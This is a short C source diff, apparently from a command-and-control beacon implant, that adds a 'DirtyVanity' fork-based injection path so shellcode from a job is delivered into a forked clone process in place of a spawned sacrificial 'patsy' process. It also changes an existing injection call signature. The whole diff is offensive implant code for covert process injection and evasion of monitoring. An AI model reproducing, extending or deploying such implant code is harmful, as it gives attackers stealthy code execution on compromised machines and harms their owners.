@@ -79,7 +79,7 @@ void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 	/* 4.12 DirtyVanity: clone ourselves instead of a patsy when configured */
 	if (procinj_execute_has(PI_EXEC_DIRTYVANITY)) {
 		spawn_log("inject: dirtyvanity fork", 0x7fffffff);
-		if (inject_dirtyvanity_forkrun(buffer, length, NULL, 0)) {
+		if (inject_dirtyvanity_forkrun(buffer, length, 0, NULL, 0)) {
 			token_guard_stop_maybe(ignoreToken);
 			return;
 		}
@@ -266,6 +266,18 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	}
 
 		startupinfo_hidden(&si, newstdout);
+
+	/* 4.12 DirtyVanity: deliver into the boot-forked nursery clone
+	 * instead of a patsy - no pipe/job tracking on this path, the clone
+	 * beacon reports through its own channel */
+	if (procinj_execute_has(PI_EXEC_DIRTYVANITY)) {
+		spawn_log("jobspawn: dirtyvanity fork offset=", (long)offset);
+		if (inject_dirtyvanity_forkrun(shellcode, slen, (int)offset, parameter, plen)) {
+			token_guard_stop_maybe(ignoreToken);
+			return;
+		}
+		spawn_log("jobspawn: dirtyvanity failed, patsy fallback", 0x7fffffff);
+	}
 
 	/* do our spawn logic, please! */
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
